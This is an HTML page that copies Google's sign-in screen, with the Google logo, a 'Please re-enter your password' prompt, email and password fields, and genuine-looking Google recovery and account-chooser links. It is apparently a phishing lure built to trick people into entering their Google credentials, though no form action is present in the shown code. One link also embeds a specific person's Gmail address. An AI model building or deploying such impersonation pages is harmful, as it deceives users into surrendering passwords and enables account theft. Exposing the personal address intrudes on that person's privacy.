<!DOCTYPE html>
<html>
<head>
<style>
.logo-w {
  margin: 25px auto 20px;
  float: none;
  display: block;
	background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png);
  background-size: 112px 36px;
	background-repeat: no-repeat;
	height: 38px;
  width: 116px;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  
	
}

p {
	font-family: 'Open Sans', arial;
	color: #555;
    font-size: 18px;
    font-weight: 400;
	padding-left:550px;
	
}
.brapper {
    width: 274px;
    padding: 40px 40px;
    margin-bottom: 20px;
    background-color: #f7f7f7;
    margin: 0 auto 25px;
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    display:block;
}


.wrapper {
    width: 96px;
    height: 96px;
    margin: 0 auto 10px;
    display: block;
    border-radius: 50%;
}
div {
	margin-top: -1px;
	margin-bottom: 10px;
}
input {

   	margin-top: -1px;
   	direction: ltr;
    height: 44px;
    font-size: 16px;
    width: 100%;
    display: block;
    margin-bottom: 100px;
    z-index: 1;
    position: relative;
    box-sizing: border-box;
    -webkit-appearance: none;
    padding: 0 8px;
    margin: 0;
    background: #fff;
    border: 1px solid #d9d9d9;
    border-top: 1px solid #c0c0c0;
    border-radius: 1px;
    color: #404040;
}
.rc-button-submit {
	width: 100%;
    display: block;
    margin-bottom: 10px;
    z-index: 1;
    position: relative;
    box-sizing: border-box;
    padding: 0;
    font-family: Arial, sans-serif;
    font-size: 13px;
    border: 1px solid #3079ed;
    color: #fff;
    text-shadow: 0 1px rgba(0,0,0,0.1);
    background-color: #4d90fe;
    /*background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);*/
    min-width: 46px;
    text-align: center;
    font-weight: 700;
    height: 36px;
    line-height: 36px;
    -webkit-user-select: none;
    cursor: default;

}
a {
	color: #427fed;
    cursor: pointer;
    text-decoration: none;
}
.happer {
	color: #427fed;
    cursor: pointer;
    text-decoration: none;
    font-size: 14px;
    padding-left:550px;

}

 
</style>
</head>
<body>
  

  <div class="logo logo-w" arial-label="Google"></div>
  
  <p>Please re-enter your password</p>
  <div class="card signin-card brapper "> 
  <img id="profile-img" class="profile-img wrapper" src="https://lh3.googleusercontent.com/-X9TAEgDoQtY/AAAAAAAAAAI/AAAAAAAAAAA/APaXHhSBif7wreZWnzzxVC0oFpHP6nDKBg/mo/photo.jpg?sz=120" alt=>
  <div>
  <input id="email" name="email" type="email" placeholder="Email" class>
  </div>
  <div>
  <input id="passwd" name="passwd" type="password" placeholder="Password" class>
  </div>
  <div>
  <input id="signin" name="signin"  class= "rc-button rc-button-submit" type="submit" value="Sign in">
  </div>
  <a id="link-forgot-passwd" href="https://accounts.google.com/signin/recovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;ss=1&amp;scc=1&amp;rm=false&amp;checkedDomains=youtube&amp;checkConnection=youtube%3A716%3A1&amp;pstMsg=1&amp;osid=1&amp;Email=palanchasaritha07%40gmail.com&amp;ignoreShadow=0&amp;hl=en">
  Need help?
  </a>
  </div>
  <p class=happer>
  <a id="account-chooser-link"   href="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;rm=false&amp;ltmpl=default&amp;scc=1&amp;ss=1&amp;osid=1&amp;checkedDomains=youtube&amp;checkConnection=youtube%3A716%3A1&amp;pstMsg=1">
  Sign in with a different account
  </a>
  </p>
</body>
</html>
